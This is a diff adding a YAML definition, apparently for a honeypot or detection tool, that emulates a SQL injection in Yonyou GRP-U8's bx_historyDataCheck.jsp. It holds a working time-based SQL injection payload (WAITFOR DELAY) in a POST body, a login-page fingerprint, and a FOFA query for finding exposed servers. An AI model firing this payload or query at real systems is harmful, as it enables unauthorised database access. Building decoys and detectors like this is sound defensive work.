@@ -1,0 +1,39 @@
+id: yonyou-u8-sqli
+info:
+  name: Yonyou U8 bx_historyDataCheck - SQL Injection
+  author: xianke
+  description: 'Yonyou U8 Grp contains a SQL injection vulnerability.
+
+    '
+  severity: high
+  reference:
+  - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/yonyou-grp-u8-bx_historyDataChecks-sqli.yaml
+  - https://github.com/MD-SEC/MDPOCS/blob/main/Yongyou_Grp_U8_bx_historyDataCheck_Sql_Poc.py
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: icon_hash="-299520369"
+  tags: yonyou,grp,sqli
+traps:
+- request:
+    method: GET
+    path: /login.jsp
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: GRP-U8
+- request:
+    method: POST
+    path: /u8qx/bx_historyDataCheck.jsp
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'userName=''%3bWAITFOR+DELAY+''0%3a0%3a5''--%26ysnd%3d%26historyFlag%3d
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
